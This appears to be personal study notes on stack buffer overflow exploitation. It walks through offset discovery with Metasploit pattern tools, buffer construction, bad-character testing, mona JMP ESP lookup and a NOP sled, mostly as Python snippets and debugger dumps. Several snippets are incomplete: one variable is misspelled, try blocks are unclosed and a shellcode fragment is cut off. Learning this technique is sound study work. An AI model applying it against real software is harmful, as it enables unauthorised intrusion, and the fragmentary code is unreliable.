## Buffer Overflow Methodology
### WORK IN PROGRESS
 
#### Enumeration 

-- Wireshark
-- nc
-- nmap 
-- requests

#### Fuzz

#### Patterns

Create a pattern to overwrite

```
msf-pattern_create -l <i.e 2560 or 0xA00>
```
Find the offset 
```
 msf-pattern_offset -l <i.e 2560 or 0xA00> -q <i.e 33794332>
```
Once the offset has been found. In this case 2288

#### Creating the inputBuffer 
```
filler = 'A' * 0x8f0 #2288   This is the space to write to get to EIP
eip = 'B' * 0x4      #4      This is the space we need to take over EIP
buffer = 'C' * 0x616 #268    This is for fun and games ;~)
This should equal 2560 as the original size of the pattern created. 
```

#### Extra Space
Depending on the app, extra buffer length may be required. This can be tested.

```
EAX 00000F0A
ECX 41414141
EDX 41414141
EBX 41414141
ESP 03CDEE6C ASCII "CCC..." 
EBP 41414141
ESI 41414141
EDI 41414141
EIP 42424242

03CDEE50   41414141  AAAA
03CDEE54   41414141  AAAA
03CDEE58   41414141  AAAA
03CDEE5C   41414141  AAAA
03CDEE60   42424242  BBBB EIP
03CDEE64   43434343  CCCC      #
03CDEE68   43434343  CCCC      # Here are 8 bytes before ESP is overwritten. This is where the 8byte offset originated from. 
03CDEE6C   43434343  CCCC ESP
03CDEE70   43434343  CCCC
```
Try to increae buffer length.

```
  filler = "A" * 0x8f0   
  eip = "B" * 0x4        
  offset = "C" * 0x8   
  buffer = 'D' * (1500 - len(filler) - len(eip) - len(offset))

  inputBuffer = filler + eip + offset + buffer 
  ```
ESP is now located at 

```
EAX 00001000
ECX 41414141
EDX 41414141
EBX 41414141
ESP 032BEE6C
```

#### Checking for bad characters
```
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10""\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20""\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30""\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40""\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50""\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60""\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70""\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80""\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90""\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0""\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0""\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0""\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0""\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0""\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0""\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

#BadChar 

try:
  print "\nSending fuzzy buffer..."

  filler = "A" * 0x8f0   
  eip = "B" * 0x4        
  offset = "C" * 0x8   
  #buffer = 'D' * (0x5376 - len(filler) - len(eip) - len(offset))

  inputBuffer = filler + eip + offset + badchars 
```
ESP - Follow in Dump and illiminate all the bad chars one by one untill you get to xff. Not pretty.

#### Execution Flow

!mona modules

!mona find -s "\xff\xe4" -m '<lib>'

In this case \xff\xe4\ is JMP ESP


Step into JMP ESP 

0x148010cf

Convert JMP ESP into litted endian.  

\xcf\x10\x80\x14

```
try:
  print "\nSending fuzzy buffer..."

  filler = "A" * 0x8f0   
  eip = "\xcf\x10\x80\x14"       
  offset = "C" * 0x8   
  e4ffer = 'D' * (0x5376 - len(filler) - len(eip) - len(offset))
  
 ```
```
"\x48\xe3\x60\x1e\xcb\x01\x19\xe5\xd3\x60\x1c\xa1\x53\x99\x6c"
    "\xba\x31\x9d\xc3\xbb\x13")

  filler = "A" * 0x8f0   
  eip = "\xcf\x10\x80\x14"       
  offset = "C" * 0x8   
  nops = "\x90" * 0x10
```
